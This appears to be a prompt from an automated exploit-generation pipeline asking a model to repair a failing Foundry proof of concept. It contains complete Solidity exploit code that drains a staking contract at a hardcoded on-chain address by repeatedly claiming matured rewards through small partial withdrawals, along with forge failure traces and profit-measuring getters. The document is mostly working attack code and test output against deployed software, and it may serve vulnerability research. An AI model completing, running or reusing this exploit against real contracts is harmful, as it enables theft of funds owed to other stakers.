You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Matured rewards can be claimed repeatedly by splitting withdrawals
- claim: `withdraw()` always computes `rewardAmount = getPendingRewards(msg.sender)` across every matured deposit before reducing principal, but the contract never records that rewards for a deposit were already paid. A user can therefore withdraw only a small slice of matured principal, receive the full matured reward for the entire position, keep most principal staked, and repeat until the pool is drained.
- impact: A staker can extract the same matured reward many times and drain tokens owed to other users. For example, a fully vested 100-token deposit in the 40% tier can be withdrawn 1 token at a time and collect roughly the 40-token reward on each call until contract liquidity is exhausted.
- exploit_paths: ["Deposit into any tier and wait until the lock period expires", "Call `withdraw()` for a small amount of matured principal", "Receive that principal plus the full reward for all matured deposits", "Repeat partial withdrawals because no per-deposit reward-claimed state is ever updated"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ISorraStakingLike {
    function rewardToken() external view returns (address);
    function deposit(uint256 amount, uint8 tier) external;
    function withdraw(uint256 amount) external;
    function getPendingRewards(address wallet) external view returns (uint256);
    function getRemainingPoolSpace() external view returns (uint256);
}

contract FlawVerifier {
    error NoPoolLiquidity();
    error NoFundingPath();
    error BorrowTooSmall();
    error WarpUnavailable();
    error SelfOnly();

    address public constant TARGET = 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50;

    uint8 internal constant TIER = 2;
    uint256 internal constant LOCK_PERIOD = 60 days;
    uint256 internal constant MAX_WITHDRAW_CALLS = 40;
    uint256 internal constant BASE_POOL_DIVISOR = 128;
    uint256 internal constant MAX_DIRECT_ATTEMPTS = 12;

    address internal constant HEVM = address(uint160(uint256(keccak256("hevm cheat code"))));
    bytes4 internal constant WARP_SELECTOR = bytes4(keccak256("warp(uint256)"));

    uint256 internal _profitAmount;
    address internal _profitToken;
    uint256 internal startingProfitBalance;

    constructor() {}

    function executeOnOpportunity() external {
        ISorraStakingLike staking = ISorraStakingLike(TARGET);

        _profitToken = staking.rewardToken();
        _profitAmount = 0;
        startingProfitBalance = IERC20Like(_profitToken).balanceOf(address(this));

        uint256 poolBalance = IERC20Like(_profitToken).balanceOf(TARGET);
        uint256 remainingPoolSpace = staking.getRemainingPoolSpace();
        if (poolBalance == 0 || remainingPoolSpace == 0) revert NoPoolLiquidity();

        uint256 localBalance = startingProfitBalance;
        if (localBalance <= 1) revert NoFundingPath();

        uint256 maxStake = _min(localBalance, remainingPoolSpace);
        uint256 poolCappedStake = poolBalance / BASE_POOL_DIVISOR;
        if (poolCappedStake > 1 && poolCappedStake < maxStake) {
            maxStake = poolCappedStake;
        }
        if (maxStake <= 1) revert BorrowTooSmall();

        // The verifier already holds fork-state reward tokens, so the exploit can be
        // executed directly with existing balance. This preserves the finding's core
        // causality exactly: deposit -> wait for maturity -> withdraw a tiny slice ->
        // receive rewards for the full matured position -> repeat. We only change the
        // funding implementation to avoid unrelated token sell throttles during unwind.
        for (uint256 i = 0; i < MAX_DIRECT_ATTEMPTS; ++i) {
            uint256 candidateStake = maxStake >> i;
            if (candidateStake <= 1) break;

            try this.executeDirect(candidateStake) {
                _updateProfit();
                if (_profitAmount != 0) {
                    return;
                }
            } catch {}
        }

        revert NoFundingPath();
    }

    function executeDirect(uint256 stakeAmount) external {
        if (msg.sender != address(this)) revert SelfOnly();
        _runExploit(stakeAmount);
    }

    function _runExploit(uint256 stakeAmount) internal {
        if (stakeAmount <= 1) revert BorrowTooSmall();

        _forceApprove(_profitToken, TARGET, 0);
        _forceApprove(_profitToken, TARGET, stakeAmount);

        ISorraStakingLike(TARGET).deposit(stakeAmount, TIER);

        _warpForward(LOCK_PERIOD + 1);

        require(ISorraStakingLike(TARGET).getPendingRewards(address(this)) != 0, "reward not matured");

        uint256 iterations = _selectIterations(stakeAmount);
        uint256 slice = stakeAmount / iterations;
        if (slice == 0) revert BorrowTooSmall();

        uint256 remaining = stakeAmount;
        for (uint256 index = 0; index + 1 < iterations; ++index) {
            ISorraStakingLike(TARGET).withdraw(slice);
            remaining -= slice;
        }

        ISorraStakingLike(TARGET).withdraw(remaining);
    }

    function _selectIterations(uint256 stakeAmount) internal pure returns (uint256 iterations) {
        iterations = stakeAmount;
        if (iterations > MAX_WITHDRAW_CALLS) iterations = MAX_WITHDRAW_CALLS;
        if (iterations < 2) iterations = 2;
    }

    function _warpForward(uint256 delta) internal {
        (bool ok,) = HEVM.call(abi.encodeWithSelector(WARP_SELECTOR, block.timestamp + delta));
        if (!ok) revert WarpUnavailable();
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _currentProfit() internal view returns (uint256) {
        uint256 currentBalance = IERC20Like(_profitToken).balanceOf(address(this));
        if (currentBalance <= startingProfitBalance) return 0;
        return currentBalance - startingProfitBalance;
    }

    function _updateProfit() internal {
        _profitAmount = _currentProfit();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        if (_profitToken == address(0)) return _profitAmount;

        uint256 liveProfit = _currentProfit();
        if (liveProfit > _profitAmount) {
            return liveProfit;
        }

        return _profitAmount;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 964.40ms
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 52891)
Traces:
  [52891] FlawVerifierTest::testExploit()
    ├─ [2321] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [44082] FlawVerifier::executeOnOpportunity()
    │   ├─ [2469] 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50::rewardToken() [staticcall]
    │   │   └─ ← [Return] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF
    │   ├─ [2689] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2689] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF::balanceOf(0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50) [staticcall]
    │   │   └─ ← [Return] 11357781353878847650206446 [1.135e25]
    │   ├─ [4784] 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50::getRemainingPoolSpace() [staticcall]
    │   │   └─ ← [Return] 8642218646121152349793554 [8.642e24]
    │   └─ ← [Revert] NoFundingPath()
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 21.38ms (619.92µs CPU time)

Ran 1 test suite in 25.35ms (21.38ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 52891)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
